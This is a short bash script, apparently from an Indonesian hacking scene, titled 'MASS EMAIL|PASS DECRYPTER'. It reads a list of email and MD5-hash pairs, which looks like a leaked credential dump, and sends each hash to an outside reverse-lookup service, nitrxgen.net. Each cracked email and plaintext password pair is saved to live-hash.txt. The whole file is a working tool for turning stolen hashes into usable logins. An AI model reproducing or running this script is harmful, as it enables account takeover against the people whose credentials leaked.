#!/bin/bash
waktu=$(date '+ %H:%M:%S')
HIJAU='\033[0;32m'
MERAH='\033[0;31m'
NORMAL='\033[0m'
CYAN='\033[0;36m'
BIRU='\033[0;34m'
PUTIH='\033[1;37m'
header(){
printf "${CYAN}
███████╗██╗██████╗ ███████╗███╗   ███╗ █████╗ ██╗      █████╗ ███████╗
██╔════╝██║██╔══██╗██╔════╝████╗ ████║██╔══██╗██║     ██╔══██╗██╔════╝
███████╗██║██████╔╝█████╗  ██╔████╔██║███████║██║     ███████║███████╗
╚════██║██║██╔═══╝ ██╔══╝  ██║╚██╔╝██║██╔══██║██║     ██╔══██║╚════██║
███████║██║██║     ███████╗██║ ╚═╝ ██║██║  ██║███████╗██║  ██║███████║
╚══════╝╚═╝╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
------------------------------------
     MASS EMAIL|PASS DECRYPTER
------------------------------------
        emaillo:passwordlo
"
}
scanskrng(){
    kocak="$1"
    cek=$(curl -s "http://www.nitrxgen.net/md5db/$2" ) #apinya
    if [[ $cek = "" ]]; then
         printf " ${MERAH}NOT FOUND${NC} => $1|$2|$cek\n"
           else
    printf " ${HIJAU} LIVE | ${GREEN} $1|$cek\n"
     echo "$1 |$cek" >> live-hash.txt
         
fi

}
header
printf "${NORMAL}══════════════════════════════════════════════════════════════════════${NC}\n\n"
#Select mailist from


ls *.txt
printf "${NORMAL}══════════════════════════════════════════════════════════════════════${NC}\n\n"
echo -n " Put Your List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
    x=$(gawk -F'|' '{ print $1 }' $list)
    y=$(gawk -F'|' '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emaillo=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordlo=($y)'
    for (( i = 0; i < "${#emaillo[@]}"; i++ )); do
    em="${emaillo[$i]}"
    pw="${passwordlo[$i]}"
        scanskrng $em $pw
done
